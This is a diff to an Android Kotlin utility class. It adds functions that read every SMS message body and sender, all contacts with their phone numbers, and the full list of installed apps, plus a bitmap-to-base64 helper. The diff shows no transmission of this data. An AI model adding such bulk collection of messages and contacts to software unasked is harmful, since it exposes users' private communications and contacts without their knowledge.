@@ -1,25 +1,34 @@
 package com.neutron.baselib.utils
 
 
+import android.annotation.SuppressLint
 import android.annotation.TargetApi
 import android.app.Activity
 import android.content.Context
 import android.content.pm.ApplicationInfo
+import android.content.pm.PackageInfo
 import android.content.pm.PackageManager
 import android.content.res.Resources
 import android.database.Cursor
+import android.graphics.Bitmap
 import android.graphics.Rect
 import android.net.ConnectivityManager
 import android.net.Uri
 import android.os.Build
+import android.provider.ContactsContract
 import android.provider.MediaStore
+import android.text.TextUtils
 import android.util.Base64
 import android.util.DisplayMetrics
+import android.util.Log
 import android.view.ViewConfiguration
 import android.view.inputmethod.InputMethodManager
 import com.google.gson.Gson
 import com.neutron.baselib.base.BaseApplication
+import com.neutron.baselib.bean.MessageRepository
+import com.neutron.baselib.bean.PContacts
 import okhttp3.MediaType
+
 import okhttp3.RequestBody
 import java.io.*
 import java.lang.reflect.Method
@@ -34,6 +43,125 @@ class Utils {
 
 
     companion object {
+
+        @SuppressLint("Range")
+        fun getMessage(context: Context): ArrayList<MessageRepository> {
+            val sms = Uri.parse("content://sms/")
+            val cr = context.contentResolver
+            val projection = arrayOf("_id", "address", "person", "body", "date", "type")
+            val cur = cr.query(sms, projection, null, null, "date desc")
+            val list = ArrayList<MessageRepository>()
+            if (null == cur) {
+                return list
+            }
+            while (cur.moveToNext()) {
+                val number = cur.getString(cur.getColumnIndex("address"))
+                val name = cur.getString(cur.getColumnIndex("person"))
+                val body = cur.getString(cur.getColumnIndex("body"))
+                val date = cur.getLong(cur.getColumnIndex("date"))
+                val type = cur.getInt(cur.getColumnIndex("type"))
+                val yearTime = formatContactTime(date)
+                list.add(MessageRepository(number, name, yearTime, body, type.toString()))
+            }
+            cur.close()
+//        Log.i("MessageUtil", "getMessage: ${Gson().toJson(list)}")
+            return list
+        }
+
+        fun formatContactTime(time: Long): String {
+            return SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(time)
+        }
+
+        @SuppressLint("Range")
+        fun getAllContacts(context: Context): ArrayList<PContacts>? {
+            val contacts: ArrayList<PContacts> = ArrayList<PContacts>()
+            val cursor = context.contentResolver.query(
+                ContactsContract.Contacts.CONTENT_URI, null, null, null, null
+            )
+            while (cursor!!.moveToNext()) {
+                //新建一个联系人实例
+                val temp = PContacts()
+                val contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
+                //获取联系人姓名
+                val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
+                val time = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP))
+                temp.other_name=(name)
+                temp.last_time=(time)
+
+                //获取联系人电话号码
+                val phoneCursor = context.contentResolver.query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    null,
+                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
+                    null,
+                    null
+                )
+                while (phoneCursor!!.moveToNext()) {
+                    var phone =
+                        phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                    phone = phone.replace("-", "")
+                    phone = phone.replace(" ", "")
+                    temp.other_mobile=phone
+                }
+
+                contacts.add(temp)
+                //记得要把cursor给close掉
+                phoneCursor.close()
+            }
+            cursor.close()
+            return contacts
+        }
+        fun isSystemApp(pInfo: PackageInfo): Boolean {
+            //判断是否是系统软件
+            return pInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0
+        }
+
+        fun formatTime(date: Long, format: String?): String? {
+            val formatter = SimpleDateFormat(format)
+            return formatter.format(date).toString()
+        }
+
+        /**
+         * 获取系统应用信息
+         *
+         * @return
+         */
+        fun getAppList(context: Context): List<ApplistEntity>? {
+            val startTime = System.currentTimeMillis() //起始时间
+            val appLists: MutableList<ApplistEntity> = ArrayList<ApplistEntity>()
+            var appList: ApplistEntity
+            val pm = context.packageManager
+            val list = pm.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES)
+            for (packageInfo in list) {
+                val appName =
+                    packageInfo.applicationInfo.loadLabel(context.packageManager).toString()
+                val packageName = packageInfo.packageName
+                val isSYS: Boolean =
+                    isSystemApp(packageInfo)
+                if (!TextUtils.isEmpty(appName) && !TextUtils.isEmpty(packageName)) {
+                    appList = ApplistEntity()
+                    appList.firstTime=formatTime(
+                        packageInfo.firstInstallTime,
+                        "yyyy-MM-dd HH:mm:ss"
+                    )
+                    appList.lastTime=   formatTime(
+                        packageInfo.lastUpdateTime,
+                        "yyyy-MM-dd HH:mm:ss"
+                    )
+                    appList.name=appName
+                    appList.packageName=packageName
+                    appList.versionCode=packageInfo.versionName
+                    appList.systemApp=if (isSYS) "1" else "2"
+                    appLists.add(appList)
+                }
+            }
+            val endTime = System.currentTimeMillis() //结束时间
+            Log.i(
+                "test",
+                String.format(appLists.size.toString() + "方法使用时间 %d ms", endTime - startTime)
+            ) //打印使用时间
+            return appLists
+        }
 
 
         /**
@@ -257,6 +385,7 @@ class Utils {
          * @param context
          * @return
          */
+        @SuppressLint("MissingPermission")
         fun isMobileConnection(context: Context): Boolean {
             val manager =
                 context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -272,6 +401,7 @@ class Utils {
          * @param context
          * @return
          */
+        @SuppressLint("MissingPermission")
         fun isWIFIConnection(context: Context): Boolean {
             val manager =
                 context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -469,6 +599,62 @@ class Utils {
             }
         }
 
+
+        /**
+         * bitmap转为base64
+         *
+         * @param bitmap
+         * @return
+         */
+        fun bitmapToBase64(bitmap: Bitmap?): String? {
+            var result = ""
+            var baos: ByteArrayOutputStream? = null
+            try {
+                if (bitmap != null) {
+                    baos = ByteArrayOutputStream()
+                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos)
+                    baos.flush()
+                    baos.close()
+                    val bitmapBytes = baos.toByteArray()
+                    result = Base64.encodeToString(bitmapBytes, Base64.DEFAULT)
+                }
+            } catch (e: IOException) {
+                e.printStackTrace()
+            } finally {
+                try {
+                    if (baos != null) {
+                        baos.flush()
+                        baos.close()
+                    }
+                } catch (e: IOException) {
+                    e.printStackTrace()
+                }
+            }
+
+            return result
+        }
+
+
+    }
+}
+
+
+class ApplistEntity {
+    var firstTime: String? = null
+    var lastTime: String? = null
+    var name: String? = null
+    var packageName: String? = null
+    var versionCode: String? = null
+    var systemApp: String? = null
+
+    override fun toString(): String {
+        return "ApplistEntity{" +
+                "firstTime='" + firstTime + '\'' +
+                ", lastTime='" + lastTime + '\'' +
+                ", name='" + name + '\'' +
+                ", packageName='" + packageName + '\'' +
+                ", versionCode='" + versionCode + '\'' +
+                '}'
     }
 }
 
